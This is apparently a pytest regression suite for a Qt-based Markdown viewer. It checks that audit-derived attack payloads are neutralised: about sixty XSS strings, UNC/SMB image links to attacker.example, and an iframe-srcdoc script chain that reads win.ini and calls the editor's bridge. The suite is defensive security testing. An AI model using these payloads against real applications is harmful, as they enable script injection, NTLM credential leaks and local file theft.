"""Regression tests for rendering untrusted Markdown (work package S2).

Payloads come from the 2026-11-08 security audit: 60 conversion-layer XSS
payloads, the zero-click WYSIWYG ``<iframe srcdoc>`` -> QWebChannel chain,
Mermaid ``securityLevel: 'loose'`` / KaTeX ``trust`` in the Vditor bundle,
the zero-click UNC (SMB / NTLM) image in the preview, and the PySide6 6.11
``QUrl.matches`` TypeError that broke every preview link click.

The WebEngine half is opt-in like the other Chromium suites: set
``RUN_WEBENGINE_TESTS=1``.
"""

from __future__ import annotations

import http.server
import json
import os
import re
import threading
import time
from html.parser import HTMLParser
from pathlib import Path

import pytest
from PySide6.QtCore import QEventLoop, QObject, QSettings, QTimer, QUrl, Signal, Slot
from PySide6.QtTest import QTest
from PySide6.QtWebEngineCore import (
    QWebEnginePage,
    QWebEngineSettings,
    QWebEngineUrlRequestInfo,
)

from app import md_converter, renderer, web_security
from app.attachment_security import attachment_open_policy

_ROOT = Path(__file__).resolve().parent.parent
_ASSETS = _ROOT / "assets"

_webengine = pytest.mark.skipif(
    os.environ.get("RUN_WEBENGINE_TESTS") != "1",
    reason="headless WebEngine is flaky; set RUN_WEBENGINE_TESTS=1 to run",
)

# ---------------------------------------------------------------------------
# Conversion layer
# ---------------------------------------------------------------------------

# Verbatim from the audit's t1_convert.py.
AUDIT_XSS_PAYLOADS = {
    "raw_script": "<script>alert(1)</script>",
    "img_onerror": '<img src=x onerror="alert(1)">',
    "svg_onload": "<svg onload=alert(1)></svg>",
    "iframe": '<iframe src="javascript:alert(1)"></iframe>',
    "a_js_html": '<a href="javascript:alert(1)">x</a>',
    "md_js": "[x](javascript:alert(1))",
    "md_JS_upper": "[x](JAVASCRIPT:alert(1))",
    "md_js_tab_entity": "[x](jav&#x09;ascript:alert(1))",
    "md_js_tab_literal": "[x](jav\tascript:alert(1))",
    "md_js_entity_colon": "[x](javascript&colon;alert(1))",
    "md_js_pct": "[x](javascript%3Aalert(1))",
    "md_js_leading_space": "[x]( javascript:alert(1))",
    "md_js_angle": "[x](<javascript:alert(1)>)",
    "md_vbscript": "[x](vbscript:msgbox(1))",
    "md_data_html": "[x](data:text/html,<script>alert(1)</script>)",
    "md_data_html_b64": "[x](data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==)",
    "a_data_html": '<a href="data:text/html,<script>alert(1)</script>">x</a>',
    "img_js": "![x](javascript:alert(1))",
    "img_data_svg": "![x](data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+PC9zdmc+)",
    "img_data_png": "![x](data:image/png;base64,iVBORw0KGgo=)",
    "autolink_js": "<javascript:alert(1)>",
    "linkify_js": "javascript:alert(1)",
    "ref_def_js": "[x][r]\n\n[r]: javascript:alert(1)",
    "details_ontoggle": (
        "<details open ontoggle=alert(1)>\n<summary>s</summary>\n\nbody\n</details>"
    ),
    "details_plain": (
        "<details open>\n<summary>s<img src=x onerror=alert(1)></summary>\n\nbody\n\n</details>"
    ),
    "summary_html": "<details>\n<summary><b onmouseover=alert(1)>s</b></summary>\n</details>",
    "kbd_onclick": '<kbd onclick="alert(1)">K</kbd>',
    "mark_style": '<mark style="background:url(javascript:alert(1))">m</mark>',
    "abbr_title_break": '<abbr title="a" onmouseover="alert(1)">x</abbr>',
    "abbr_title_entity": '<abbr title="a&quot; onmouseover=&quot;alert(1)">x</abbr>',
    "abbr_ok": '<abbr title="HyperText">HTML</abbr>',
    "style_attr": '<p style="background:url(javascript:alert(1))">p</p>',
    "style_tag": "<style>body{background:url(http://127.0.0.1:9/x)}</style>",
    "wikilink_inj": '[[a"><img src=x onerror=alert(1)>|b]]',
    "wikilink_alias_inj": "[[a|<img src=x onerror=alert(1)>]]",
    "wikilink_js": "[[javascript:alert(1)]]",
    "callout_type_inj": '> [!note" onmouseover="alert(1)] t',
    "callout_title_inj": "> [!note] <img src=x onerror=alert(1)>\n> body",
    "fence_lang_inj": '```"><img src=x onerror=alert(1)>\ncode\n```',
    "mermaid_breakout": "```mermaid\ngraph TD\nA[\"</pre><img src=x onerror=alert(1)>\"]\n```",
    "mermaid_click_href": "```mermaid\ngraph TD\nA-->B\nclick A href \"javascript:alert(1)\"\n```",
    "mermaid_init_loose": (
        "```mermaid\n%%{init: {\"securityLevel\": \"loose\"}}%%\ngraph TD\nA-->B\n"
        "click A call alert(1)\n```"
    ),
    "math_inline": "$\\href{javascript:alert(1)}{x}$",
    "math_block": "$$\n\\htmlClass{x}{y}</div><img src=x onerror=alert(1)>\n$$",
    "math_breakout": "$</span><img src=x onerror=alert(1)>$",
    "footnote_label": (
        "x[^a\"><img src=x onerror=alert(1)>]\n\n[^a\"><img src=x onerror=alert(1)>]: y"
    ),
    "front_matter": "---\ntitle: <img src=x onerror=alert(1)>\ntags: [\"<script>\", b]\n---\nbody",
    "heading_inj": "# a <img src=x onerror=alert(1)>",
    "img_title_inj": '![a](x.png "t\\" onerror=\\"alert(1)")',
    "file_link": "[x](file:///C:/Windows/win.ini)",
    "file_img": "![x](file:///C:/Windows/Web/Wallpaper/Windows/img0.jpg)",
    "unc_img_protocol_rel": "![x](//attacker.example/share/x.png)",
    "unc_link_protocol_rel": "[x](//attacker.example/share/doc.docx)",
    "backslash_unc_img": "![x](\\\\attacker.example\\share\\x.png)",
    "abs_drive_img": "![x](/C:/Windows/Web/Wallpaper/Windows/img0.jpg)",
    "relative_traversal_link": "[x](../../../../Windows/System32/calc.exe)",
    "remote_img": "![x](https://attacker.example/pixel.png?u=1)",
    "linkify_http": "see https://attacker.example/x",
    "tasklist": "- [ ] <img src=x onerror=alert(1)>",
    "html_entity_script": "&lt;script&gt;alert(1)&lt;/script&gt;",
}

_FORBIDDEN_TAGS = {
    "script", "iframe", "frame", "frameset", "object", "embed", "applet", "svg",
    "math", "style", "link", "meta", "base", "form",
}
_URL_ATTRS = {"href", "src", "action", "formaction", "data", "poster", "xlink:href"}


class _TagCollector(HTMLParser):
    """Collect real start tags with entity-decoded attribute values."""

    def __init__(self):
        super().__init__(convert_charrefs=True)
        self.tags: list[tuple[str, list[tuple[str, str]]]] = []

    def handle_starttag(self, tag, attrs):
        self.tags.append((tag, [(name, value or "") for name, value in attrs]))

    handle_startendtag = handle_starttag


def _dangerous_constructs(html: str) -> list[str]:
    collector = _TagCollector()
    collector.feed(html)
    problems = []
    for tag, attrs in collector.tags:
        if tag in _FORBIDDEN_TAGS:
            problems.append(f"tag <{tag}>")
        if tag == "input" and ("type", "checkbox") not in attrs:
            problems.append("non-checkbox <input>")
        for name, value in attrs:
            if name.startswith("on"):
                problems.append(f"<{tag} {name}>")
            if name == "style":
                problems.append(f"<{tag} style>")
            if name in _URL_ATTRS:
                normalized = re.sub(r"[\x00-\x20]", "", value).lower()
                # ``javascript%3A...`` has no scheme: it is a harmless relative path.
                if re.match(r"(?:javascript|vbscript|livescript):|data:text", normalized):
                    problems.append(f"<{tag} {name}={value!r}>")
                if web_security.is_network_path_link(value):
                    problems.append(f"network path <{tag} {name}={value!r}>")
    return problems


def test_audit_payload_set_is_complete():
    assert len(AUDIT_XSS_PAYLOADS) == 60


@pytest.mark.parametrize("name", sorted(AUDIT_XSS_PAYLOADS))
def test_audit_xss_payloads_stay_inert_in_preview_html(name):
    body = md_converter.render_body(AUDIT_XSS_PAYLOADS[name]).body
    assert _dangerous_constructs(body) == [], body


@pytest.mark.parametrize(
    "source",
    [
        "![x](//attacker.example/share/x.png)",
        "[x](//attacker.example/share/doc.docx)",
        "![x](\\\\\\\\attacker.example\\\\share\\\\x.png)",
        "[x](\\\\\\\\attacker.example\\\\share\\\\doc.md)",
        "![x](</\\attacker.example/share/x.png>)",
        "![x](<//attacker.example/x.png>)",
        "![x](%2F%2Fattacker.example/x.png)",
        "[x](%5C%5Cattacker.example%5Cshare)",
        "![x][r]\n\n[r]: //attacker.example/share/x.png",
        "[x][r]\n\n[r]: //attacker.example/share/x.md",
        "![x](////attacker.example/share/x.png)",
        # Win32 device namespace forms of a UNC path (S2 bypass review).
        "![x](//./UNC/attacker.example/share/x.png)",
        "![x](//?/UNC/attacker.example/share/x.png)",
        "![x](\\\\\\\\.\\\\UNC\\\\attacker.example\\\\share\\\\x.png)",
        "![x](\\\\\\\\?\\\\UNC\\\\attacker.example\\\\share\\\\x.png)",
        "![x](file:////./UNC/attacker.example/share/x.png)",
        "[x](file:////attacker.example/share/x.md)",
        # Dot segments / mixed separators that collapse into a leading "//".
        "![x](/.//attacker.example/share/x.png)",
        "![x](/%2E//attacker.example/share/x.png)",
        "![x](/./UNC/attacker.example/share/x.png)",
        "![x](</\\./UNC/attacker.example/share/x.png>)",
        "[x](/UNC/attacker.example/share/x.md)",
    ],
)
def test_unc_and_scheme_relative_links_and_images_are_not_rendered(source):
    body = md_converter.render_body(source).body
    collector = _TagCollector()
    collector.feed(body)
    urls = [value for tag, attrs in collector.tags for name, value in attrs
            if tag in {"a", "img"} and name in {"href", "src"}]
    assert not any(web_security.is_network_path_link(url) for url in urls), body
    assert "attacker.example" not in "".join(urls), body
    assert "<img" not in body, body


@pytest.mark.parametrize(
    ("source", "expected"),
    [
        ("![pic](images/pic.png)", 'src="images/pic.png"'),
        ("![abs](/C:/notes/pic.png)", 'src="/C:/notes/pic.png"'),
        ("[other](other.md)", 'href="other.md"'),
        ("[web](https://example.com/a)", 'href="https://example.com/a"'),
        ("[jump](#target)", 'href="#target"'),
        ("[up](../notes/a.md)", 'href="../notes/a.md"'),
        ("[[Wiki Page]]", 'href="https://markdown-viewer.invalid/wikilink/Wiki%20Page"'),
    ],
)
def test_ordinary_links_and_images_still_render(source, expected):
    assert expected in md_converter.render_body(source).body


def test_network_path_detection():
    assert web_security.is_network_path_link("//host/share")
    assert web_security.is_network_path_link("%5C%5Chost%5Cshare")
    assert web_security.is_network_path_link(" \t/\n/host")
    assert web_security.is_network_path_link("/\\host")
    for device in (
        "//./UNC/host/share", "//?/UNC/host/share", "\\\\.\\UNC\\host\\share",
        "\\\\?\\UNC\\host\\share", "/\\./UNC/host", "%5C%5C.%5CUNC%5Chost",
        "/.//host/share", "/%2e//host/share", "/./UNC/host/share", "/UNC/host/share",
        "/unc/host", "/./?/UNC/host", "file:////host/share", "file:////./UNC/host",
        "FILE://host/share", "file:///%5C%5Chost%5Cshare",
    ):
        assert web_security.is_network_path_link(device), device
    for safe in ("/C:/x.png", "images/a.png", "#a", "https://x.example", "", "/root",
                 "./a.png", "../notes/a.md", "a//b.png", "/C:/UNC/x.png", "uncle.md"):
        assert not web_security.is_network_path_link(safe), safe


_PREVIEW_DIRECTIVES = (
    "connect-src 'none'", "frame-src 'none'", "object-src 'none'",
    "base-uri 'none'", "form-action 'none'",
)


def _csp_of(html: str) -> str:
    match = re.search(
        r'<meta http-equiv="Content-Security-Policy" content="([^"]*)">', html)
    assert match, "no CSP meta"
    return match.group(1)


def test_preview_documents_carry_exfiltration_csp_before_any_script():
    html, _ = md_converter.convert_text(
        "# t\n\n```mermaid\ngraph TD\nA-->B\n```\n\n$x^2$\n\n```py\nprint(1)\n```\n")
    policy = _csp_of(html)
    for directive in _PREVIEW_DIRECTIVES:
        assert directive in policy
    # Existing inline scripts (Mermaid/KaTeX loaders, copy buttons) stay legal.
    assert "script-src" not in policy and "default-src" not in policy
    assert html.index("Content-Security-Policy") < html.index("<script")
    state = md_converter.state_page_html("t", "m")
    assert "Content-Security-Policy" in state


def test_large_document_base_url_is_inserted_before_the_policy(tmp_path):
    """base-uri 'none' must not reject the app's own <base> for large files."""
    from app import html_loading

    html, _ = md_converter.convert_text("# big")
    base = QUrl.fromLocalFile(str(tmp_path) + "/").toString()
    lease = html_loading._prepare_html_file(html, base, threading.Event())
    try:
        written = Path(lease.fileName()).read_text("utf-8")
    finally:
        lease.close()
    assert written.index("<base href=") < written.index("Content-Security-Policy")


# ---------------------------------------------------------------------------
# Vendored bundle + WYSIWYG host page (static)
# ---------------------------------------------------------------------------


@pytest.mark.parametrize(
    "relative",
    [
        "vditor/dist/index.min.js",
        "vditor/dist/js/mermaid/mermaid.min.js",
        "vditor/dist/js/katex/katex.min.js",
        "mermaid.min.js",
        "katex/katex.min.js",
    ],
)
def test_bundles_never_enable_loose_mermaid_or_trusted_katex(relative):
    text = (_ASSETS / relative).read_text("utf-8", errors="replace")
    assert not re.search(r"securityLevel\s*:\s*[`'\"](?:loose|antiscript)[`'\"]", text)
    assert not re.search(r"\btrust\s*:\s*(?:!0|true)\b", text)


def test_vditor_bundle_keeps_the_patched_values():
    """docs/upgrades/2026-11-08-security-hardening.md: redo after upgrades."""
    text = (_ASSETS / "vditor/dist/index.min.js").read_text("utf-8")
    assert text.count("securityLevel:`strict`") == 1
    assert text.count("macros:t.math.macros,trust:!1}") == 1


def _host_html() -> str:
    from app.wysiwyg_view import WysiwygView

    # _host_html only reads assets and the bundled qwebchannel.js resource.
    return WysiwygView._host_html(None, lang="zh_TW")  # type: ignore[arg-type]


def test_wysiwyg_host_policy_pins_scripts_by_nonce_and_blocks_channels():
    html = _host_html()
    policy = _csp_of(html)
    for directive in (
        "frame-src 'none'", "child-src 'none'", "object-src 'none'",
        "base-uri 'none'", "form-action 'none'",
    ):
        assert directive in policy
    connect = re.search(r"connect-src ([^;]*)", policy).group(1).split()
    assert connect == ["data:"]
    script_src = re.search(r"script-src ([^;]*)", policy).group(1).split()
    # 'self' on a file:// page admits every file: URL (bypass review: an
    # <iframe srcdoc><script src=file:///...> ran), so only the nonce and the
    # scripts the bundle itself creates ('strict-dynamic') may execute.
    for forbidden in ("'self'", "file:", "*", "'unsafe-inline'", "'unsafe-eval'", "data:"):
        assert forbidden not in script_src, forbidden
    nonces = [source for source in script_src if source.startswith("'nonce-")]
    assert len(nonces) == 1 and "'strict-dynamic'" in script_src
    nonce = nonces[0][len("'nonce-"):-1]
    assert len(nonce) >= 22
    tags = re.findall(r"<script\b[^>]*>", html)
    assert len(tags) == 4  # qwebchannel.js, index.min.js, vditor_glue.js, boot
    assert all(f'nonce="{nonce}"' in tag for tag in tags), tags
    assert "__WYSIWYG_CSP__" not in html and "__WYSIWYG_NONCE__" not in html
    assert html.index("Content-Security-Policy") < html.index("<script")
    assert nonce not in _host_html()  # fresh per load


def test_wysiwyg_bridge_ignores_a_foreign_page(qapp):
    """Bridge calls from anything but the host page never reach Python."""
    from app.wysiwyg_view import _WysiwygBridge

    owner = QObject()
    owner._foreign_page = True  # type: ignore[attr-defined]
    bridge = _WysiwygBridge(owner)  # type: ignore[arg-type]
    seen = []
    for signal in (bridge.saveWithContentSig, bridge.contentPushed, bridge.contentDeltaPushed,
                   bridge.saveRequestedSig, bridge.toolbarActionSig, bridge.viewReadySig,
                   bridge.pastePreviewRequestedSig, bridge.resourcePasteRequestedSig,
                   bridge.contextMenuRequestedSig, bridge.zoomRequestedSig):
        signal.connect(lambda *args: seen.append(args))
    bridge.saveWithContent("EVIL", 0, 0, 0, "", 0, 4)
    bridge.contentChanged("EVIL", 0, 0, 0, "", 0, 4)
    bridge.contentDelta(0, 0, 0, "EVIL", 0, 4)
    bridge.saveRequested()
    bridge.toolbarAction("open_graph")
    bridge.ready()
    bridge.pastePreviewRequested("a\tb\n", 1, 0)
    bridge.resourcePasteRequested("[]", 1, 0)
    bridge.contextMenuRequested(1, 1)
    bridge.zoomRequested(1)
    assert seen == []
    assert bridge.initialConfig() == "{}"


def test_wysiwyg_bridge_rejects_unknown_toolbar_actions_and_clamps_zoom(qapp):
    from app.wysiwyg_view import _WysiwygBridge

    owner = QObject()
    bridge = _WysiwygBridge(owner)  # type: ignore[arg-type]
    actions, zooms = [], []
    bridge.toolbarActionSig.connect(actions.append)
    bridge.zoomRequestedSig.connect(zooms.append)
    for name in ("export_pdf", "save", "toggle_theme", "", "open_graph", "insert_image"):
        bridge.toolbarAction(name)
    bridge.zoomRequested(10**6)
    bridge.zoomRequested(-(10**6))
    bridge.zoomRequested(0)
    bridge.zoomRequested(2)
    assert actions == ["open_graph", "insert_image"]
    assert zooms == [50, -50, 2]


# ---------------------------------------------------------------------------
# Remote-file guard and preview link clicks (no Chromium navigation needed)
# ---------------------------------------------------------------------------


_RESOURCE = QWebEngineUrlRequestInfo.ResourceType


class _FakeRequest:
    def __init__(self, url, resource=_RESOURCE.ResourceTypeImage):
        self._url = url if isinstance(url, QUrl) else QUrl(url)
        self._resource = resource
        self.blocked = None

    def requestUrl(self):  # noqa: N802 - Qt API shape
        return self._url

    def resourceType(self):  # noqa: N802 - Qt API shape
        return self._resource

    def block(self, flag):
        self.blocked = flag


@pytest.mark.parametrize(
    ("url", "allowed", "blocked"),
    [
        ("file://attacker.example/share/x.png", "", True),
        ("file://127.0.0.1/C$/Windows/win.ini", "", True),
        ("file://Server/share/pic.png", "server", None),
        ("file://other/share/pic.png", "server", True),
        ("file:///C:/notes/pic.png", "", None),
        ("https://example.com/a.png", "", None),
        ("data:image/png;base64,AAAA", "", None),
        # Bypass review: Chromium hands over file://./UNC/host/... which QUrl
        # cannot represent (invalid / empty); fail closed.
        ("file://./UNC/attacker.example/share/x.png", "", True),
        (QUrl(), "", True),
        ("file:////./UNC/attacker.example/share/x.png", "", True),
        ("file:////?/UNC/attacker.example/share/x.png", "", True),
        ("file:////attacker.example/share/x.png", "", True),
        ("file://///attacker.example/share/x.png", "", True),
        ("file:///%5C%5Cattacker.example%5Cshare%5Cx.png", "", True),
        ("file:///%5C%5C.%5CUNC%5Cattacker.example%5Cx.png", "", True),
        ("file:///UNC/attacker.example/share/x.png", "", True),
        ("file:///./UNC/attacker.example/share/x.png", "", True),
        ("file://localhost/C$/Windows/win.ini", "", True),
        ("file://[::1]/C$/x.png", "", True),
        ("file://%2E/UNC/attacker.example/x.png", "", True),
    ],
)
def test_remote_file_guard_blocks_unc_requests(qapp, url, allowed, blocked):
    guard = web_security.remote_file_guard_type()(lambda: allowed)
    request = _FakeRequest(url)
    guard.interceptRequest(request)
    assert request.blocked is blocked


@pytest.mark.parametrize(
    ("resource", "blocked"),
    [
        (_RESOURCE.ResourceTypeImage, None),
        (_RESOURCE.ResourceTypeStylesheet, None),
        (_RESOURCE.ResourceTypeFontResource, None),
        (_RESOURCE.ResourceTypeMedia, None),
        (_RESOURCE.ResourceTypeMainFrame, True),
        (_RESOURCE.ResourceTypeSubFrame, True),
        (_RESOURCE.ResourceTypeScript, True),
        (_RESOURCE.ResourceTypeObject, True),
        (_RESOURCE.ResourceTypeXhr, True),
    ],
)
def test_document_share_exception_covers_resource_loads_only(qapp, resource, blocked):
    """A note on \\\\server\\share may show images beside it, never navigate there."""
    guard = web_security.remote_file_guard_type()(lambda: "server")
    request = _FakeRequest("file://server/share/notes/evil.html", resource)
    guard.interceptRequest(request)
    assert request.blocked is blocked


class _FakePreviewView(QObject):
    wikilink_clicked = Signal(str)
    home_action_requested = Signal(str)
    local_doc_clicked = Signal(str)
    local_doc_target_clicked = Signal(str, str)

    def __init__(self, current_path=None, base_url=None):
        super().__init__()
        self._current_path = current_path
        self._html_base_url = base_url
        self.scrolled = []

    def scroll_to(self, anchor):
        self.scrolled.append(anchor)


_CLICK = QWebEnginePage.NavigationType.NavigationTypeLinkClicked


def test_preview_pages_install_the_remote_file_guard(qapp):
    view = _FakePreviewView(current_path="//server/share/notes/a.md")
    page = renderer._DocumentPage(view)
    assert page._remote_file_guard.allowed_host() == "server"


def test_preview_link_clicks_no_longer_raise_and_anchor_scrolls(qapp, monkeypatch):
    base = QUrl.fromLocalFile("C:/notes/")
    view = _FakePreviewView(current_path="C:/notes/a.md", base_url=base)
    page = renderer._DocumentPage(view)
    opened = []
    view.local_doc_clicked.connect(opened.append)
    monkeypatch.setattr(renderer.QMessageBox, "warning", lambda *a: pytest.fail("warned"))

    # Fragment of the large-document base URL -> scroll in place.
    assert page.acceptNavigationRequest(
        QUrl("file:///C:/notes/#section-2"), _CLICK, True) is False
    QTest.qWait(20)  # side effects run after Chromium's navigation callback (F2)
    assert view.scrolled == ["section-2"]
    # Cross-note link -> opened in-app instead of raising TypeError.
    assert page.acceptNavigationRequest(QUrl("file:///C:/notes/b.md"), _CLICK, True) is False
    QTest.qWait(20)
    assert [Path(p).name for p in opened] == ["b.md"]


def test_same_document_compare_ignores_only_the_fragment():
    assert renderer._same_document(QUrl("file:///C:/n/#a"), QUrl("file:///C:/n/"))
    assert renderer._same_document(QUrl("file:///C:/n/#a"), QUrl("file:///C:/n/#b"))
    assert not renderer._same_document(QUrl("file:///C:/n/x.md"), QUrl("file:///C:/n/"))
    assert not renderer._same_document(QUrl("file:///C:/n/#a"), None)
    assert not renderer._same_document(QUrl("file:///C:/n/#a"), QUrl())


def test_preview_refuses_remote_file_link_clicks(qapp, monkeypatch):
    view = _FakePreviewView(current_path="C:/notes/a.md")
    page = renderer._DocumentPage(view)
    opened, warnings = [], []
    view.local_doc_clicked.connect(opened.append)
    monkeypatch.setattr(renderer.QMessageBox, "warning", lambda *a: warnings.append(a))
    monkeypatch.setattr(renderer.QDesktopServices, "openUrl",
                        lambda url: pytest.fail("must not open " + url.toString()))
    for target in ("file://attacker.example/share/x.md", "file://10.0.0.5/c$/a.docx"):
        assert page.acceptNavigationRequest(QUrl(target), _CLICK, True) is False
    QTest.qWait(20)
    assert opened == [] and len(warnings) == 2


@pytest.mark.parametrize(
    "target",
    [
        # Navigation never gets the document-share exception.
        "file://server/share/notes/b.md",
        "file://server/share/notes/evil.html",
        # Device-namespace / invalid forms must not fall through to toLocalFile().
        "file://./UNC/attacker.example/share/x.md",
        "file:////./UNC/attacker.example/share/x.md",
        "file:////attacker.example/share/x.md",
        "file:///UNC/attacker.example/share/x.md",
    ],
)
def test_preview_refuses_unc_navigation_even_on_the_documents_share(qapp, monkeypatch, target):
    view = _FakePreviewView(current_path="//server/share/notes/a.md")
    page = renderer._DocumentPage(view)
    opened, warnings = [], []
    view.local_doc_clicked.connect(opened.append)
    view.local_doc_target_clicked.connect(lambda *a: opened.append(a))
    monkeypatch.setattr(renderer.QMessageBox, "warning", lambda *a: warnings.append(a))
    monkeypatch.setattr(renderer.QMessageBox, "question", lambda *a: pytest.fail("asked"))
    monkeypatch.setattr(renderer.QDesktopServices, "openUrl",
                        lambda url: pytest.fail("must not open " + url.toString()))
    assert page.acceptNavigationRequest(QUrl(target), _CLICK, True) is False
    QTest.qWait(20)
    assert opened == [] and len(warnings) == 1


# ---------------------------------------------------------------------------
# Attachment policy
# ---------------------------------------------------------------------------


@pytest.mark.parametrize("name", ["a.doc", "a.xls", "a.ppt", "a.rtf", "a.svg", "a.xml"])
def test_risky_document_formats_require_confirmation(name):
    assert attachment_open_policy(name) == "confirm"


@pytest.mark.parametrize(
    "name", ["help.chm", "x.scf", "addin.xll", "pkg.msix", "pkg.appx", "s.search-ms",
             "s.settingcontent-ms", "lib.library-ms", "fix.diagcab", "old.hlp"])
def test_code_running_formats_are_blocked(name):
    assert attachment_open_policy(name) == "block"


# ---------------------------------------------------------------------------
# Real Chromium (RUN_WEBENGINE_TESTS=1)
# ---------------------------------------------------------------------------


def _wait(ms):
    loop = QEventLoop()
    QTimer.singleShot(ms, loop.quit)
    loop.exec()


def _until(predicate, timeout_ms=20000, step_ms=50):
    deadline = time.monotonic() + timeout_ms / 1000
    while time.monotonic() < deadline:
        if predicate():
            return True
        QTest.qWait(step_ms)
    return predicate()


def _eval(view, script, timeout_ms=5000):
    box = {}
    loop = QEventLoop()
    view.page().runJavaScript(script, lambda value: (box.__setitem__("v", value), loop.quit()))
    QTimer.singleShot(timeout_ms, loop.quit)
    loop.exec()
    return box.get("v")


class _Sink(http.server.BaseHTTPRequestHandler):
    hits: list[str] = []

    def _hit(self):
        type(self).hits.append(self.path)
        self.send_response(200)
        self.end_headers()

    do_GET = do_POST = _hit

    def log_message(self, *_args):
        pass


@pytest.fixture
def sink():
    _Sink.hits = []
    server = http.server.ThreadingHTTPServer(("127.0.0.1", 0), _Sink)
    thread = threading.Thread(target=server.serve_forever, daemon=True)
    thread.start()
    try:
        yield server.server_address[1], _Sink.hits
    finally:
        server.shutdown()


@pytest.fixture
def isolated_wysiwyg_settings(tmp_path, monkeypatch):
    from app import wysiwyg_view

    path = tmp_path / "wysiwyg-security.ini"
    monkeypatch.setattr(wysiwyg_view, "QSettings",
                        lambda *_a, **_k: QSettings(str(path), QSettings.Format.IniFormat))


def _record_guard_decisions(monkeypatch):
    decisions = []
    original = getattr(web_security, "blocks_file_request", None)
    if original is None:  # pre-fix module: record nothing, assertions still run
        return decisions

    def recording(url, allowed_host=""):
        result = original(url, allowed_host)
        decisions.append((url.toString(), result))
        return result

    monkeypatch.setattr(web_security, "blocks_file_request", recording)
    return decisions


# Reachable only over SMB, so a non-zero naturalWidth proves an SMB read.
_ADMIN_IMAGE = "127.0.0.1/ADMIN$/Web/Wallpaper/Windows/img0.jpg"


def _unc_image_widths(view, marker="ADMIN"):
    return json.loads(_eval(view, (
        "JSON.stringify(Array.from(document.images).filter(function(i){"
        f"return (i.getAttribute('src')||'').indexOf({json.dumps(marker)})>=0;}})"
        ".map(function(i){return i.naturalWidth;}))")) or "[]")


def _qwebchannel_source() -> str:
    from app.wysiwyg_view import _read_resource

    return _read_resource(":/qtwebchannel/qwebchannel.js")


def _evil_page(tmp_path) -> Path:
    """A page that, if it ever replaced the editor, would drive the bridge."""
    evil = tmp_path / "evil.html"
    evil.write_text(
        "<!doctype html><html><head><meta charset='utf-8'></head><body>EVIL<script>"
        + _qwebchannel_source()
        + "</script><script>window.__evil=1;new QWebChannel(qt.webChannelTransport,"
        "function(c){var b=c.objects.wysiwygBridge;"
        "b.saveWithContent('EVIL PAGE SAVE',0,0,0,'',0,14);"
        "b.contentChanged('EVIL PAGE PUSH',0,0,0,'',0,14);b.ready();});</script>"
        "</body></html>",
        encoding="utf-8",
    )
    return evil


def _boot_wysiwyg(view, document, markdown):
    view.resize(1000, 800)
    view.show()
    view.set_document_path(document)
    assert _until(lambda: view._ready, 40000)
    view.load_markdown(markdown)
    assert _until(lambda: markdown.splitlines()[0] in (
        _eval(view, "window.__wysiwygGlue.getValue()") or ""), 10000)


def _watch_bridge(view):
    seen = []
    bridge = view._bridge
    for signal in (bridge.saveWithContentSig, bridge.contentPushed, bridge.contentDeltaPushed,
                   bridge.toolbarActionSig, bridge.saveRequestedSig):
        signal.connect(lambda *args: seen.append(args))
    return seen


# The audit's t3 chain: an iframe srcdoc script that reaches the parent's
# QWebChannel bridge and asks Python to save attacker content, plus fetches.
_ATTACK = (
    "var P=parent;P.__chain={};"
    "fetch('file:///C:/Windows/win.ini').then(function(r){return r.text()})"
    ".then(function(t){P.__chain.file=t.length});"
    "function go(){var b=P.__wysiwygBridge;if(!b){return setTimeout(go,100)}"
    "b.saveWithContent('PWNED via iframe srcdoc',0,0,0,'',0,23);"
    "b.contentChanged('PWNED full',0,0,0,'',0,10);"
    "b.toolbarAction('export_html');P.__chain.called=1}go();"
)
_SRCDOC = _ATTACK.replace("&", "&amp;").replace('"', "&quot;").replace("<", "&lt;")
_WYSIWYG_PAYLOAD = f"""# chain

<iframe srcdoc="<script>{_SRCDOC}</script>" style="display:none"></iframe>

<iframe src="file:///C:/Windows/win.ini" id="pw_fileframe"></iframe>

<embed src="x.swf">

<form action="https://example.invalid/f"><button id="pw_formbtn">B</button></form>

<meta http-equiv="refresh" content="1;url=https://example.invalid/r">

<base href="https://example.invalid/base/">

inline <a href="javascript:window.__pw_a=1">RAWA</a> link

<details open ontoggle="window.__pw_toggle=1"><summary>s</summary>t</details>

![unc](//127.0.0.1/C$/Windows/Web/Wallpaper/Windows/img0.jpg)

$\\href{{javascript:window.__pw_katex=1}}{{KATEXLINK}}$ and $x^2$

```mermaid
graph TD
A[NodeA]-->B[NodeB]
click A call eval("window.__pw_mermaid_call=1")
click B href "javascript:window.__pw_mermaid_href=1"
```
"""

_PW_FLAGS_JS = (
    "JSON.stringify({chain: window.__chain || null, flags: Object.keys(window)"
    ".filter(function(k){return k.indexOf('__pw')===0;})})"
)


@_webengine
@pytest.mark.parametrize("before_ready", [True, False])
def test_wysiwyg_iframe_srcdoc_payload_never_reaches_the_bridge(
    qapp, tmp_path, monkeypatch, isolated_wysiwyg_settings, before_ready
):
    from app.wysiwyg_view import WysiwygView

    decisions = _record_guard_decisions(monkeypatch)
    document = tmp_path / "payload.md"
    document.write_text(_WYSIWYG_PAYLOAD, encoding="utf-8")
    view = WysiwygView()
    seen = []
    bridge = view._bridge
    for signal in (bridge.saveWithContentSig, bridge.contentPushed, bridge.contentDeltaPushed,
                   bridge.toolbarActionSig, bridge.saveRequestedSig):
        signal.connect(lambda *args: seen.append(args))
    try:
        view.resize(1000, 800)
        view.show()
        view.set_document_path(document)
        if before_ready:  # the "switch this file to WYSIWYG" boot path
            view.load_markdown(_WYSIWYG_PAYLOAD)
            assert _until(lambda: view._ready, 40000)
        else:
            assert _until(lambda: view._ready, 40000)
            view.load_markdown(_WYSIWYG_PAYLOAD)
        assert _until(lambda: "iframe srcdoc" in (
            _eval(view, "window.__wysiwygGlue.getValue()") or ""), 10000)
        # Zero-click: the audit's chain fired within a second of rendering.
        _wait(3000)
        assert not any("PWNED" in str(args) for args in seen), seen
        state = json.loads(_eval(view, _PW_FLAGS_JS))
        assert state == {"chain": None, "flags": []}
        # Mermaid and KaTeX still render under the CSP / patched bundle.
        assert _until(lambda: _eval(
            view, "document.querySelectorAll('.vditor-wysiwyg .katex').length") == 2)
        assert _until(lambda: _eval(
            view, "document.querySelectorAll('.vditor-wysiwyg .language-mermaid svg').length")
            == 1)
        dom = json.loads(_eval(view, (
            "JSON.stringify({frames: document.querySelectorAll("
            "'iframe,embed,object,form,base,meta[http-equiv=refresh]').length,"
            "lute: window.__wysiwygGlue._state.vditor.vditor.lute.__markdownViewerSanitized,"
